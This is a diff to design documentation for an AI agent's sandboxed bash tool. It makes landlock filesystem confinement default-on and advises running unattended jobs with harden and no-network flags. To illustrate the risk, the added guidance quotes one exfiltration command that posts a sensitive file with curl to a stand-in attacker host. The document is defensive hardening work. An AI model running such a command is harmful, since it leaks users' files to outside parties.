@@ -182,16 +182,28 @@ reusing the same in-process `TaskSpawner` as the `task` tool. Plugin tools are
 registered alongside these at runtime.
 
 The `bash` tool has three isolation layers: Docker execution mode
-(`--docker`, ADR-036) for full container isolation, lightweight
-rlimit hardening (`--harden`, ADR-054) for the non-Docker path, and an
-optional Linux landlock syscall filter (WO 22.1, feature-gated behind
-`landlock` — NOT default-on; opt in via `--features landlock`). The
+(`--docker`, ADR-036) for full container isolation, lightweight rlimit
+hardening (`--harden`, ADR-054) for the non-Docker path, and Linux landlock
+filesystem confinement (WO 27.1, default-on for Linux, fail-closed, applied
+via the same `pre_exec` hook as the rlimits — not a Cargo feature). The
 `--harden` flag applies `RLIMIT_CPU` / `RLIMIT_AS` / `RLIMIT_FSIZE` to
 the child shell in a `pre_exec` hook (Unix only; Windows no-op with a
 warning). It is ignored when `--docker` is set (Docker already enforces
 `--memory` and `--cpus`). seccomp is documented as future work in
 ADR-054 — it needs a BPF compiler that's too heavy for the
 size-optimized binary.
+
+**Operator guidance for unattended runs (WO 27.5 R3):** for headless / CI /
+scheduled-job execution, run with `--harden --no-network`. `--no-network` is
+the only thing that blocks data exfiltration like
+`curl -F f=@sensitive https://attacker.example/` — landlock is FS-only and
+the deny-list is a substring tripwire, not a network boundary. `--no-network`
+calls `unshare(CLONE_NEWNET)` (Linux only) to place every spawned shell in an
+empty network namespace, so no outbound connection can succeed regardless of
+what the model emits. Network access stays opt-in per the user-confirmed
+design (a tool that legitimately needs `cargo` / `npm` / `git fetch` cannot
+run with `--no-network`); the default interactive posture is network-on, the
+recommended unattended posture is network-off.
 
 WO 15.3 closed three SSRF / injection surfaces across the networked
 tools. (1) The `computer_use` Chrome launcher now passes
@@ -915,8 +927,10 @@ The root `Cargo.toml` exposes these features:
    Rust calls with full in-process event context (ADR-047).
 - `pty` (non-default) — PTY-backed interactive bash commands via `portable-pty`
   (WO 21.5-R2; opt in via `--features pty`).
-- `landlock` (non-default) — optional Linux landlock syscall filter for the
-  bash tool (WO 22.1; opt-in only, not default-on — `--features landlock`).
+- `landlock` — no longer a Cargo feature (WO 27.1). The landlock module is
+  compiled unconditionally on Linux via `cfg(target_os = "linux")` and
+  applied by default in the bash `pre_exec` hook (fail-closed). The
+  `--features landlock` flag is a no-op kept only for backward compat.
 - `otel` (non-default) — OpenTelemetry span/metric export.
 
 Two plugins are feature-gated compiled-in modules, served as
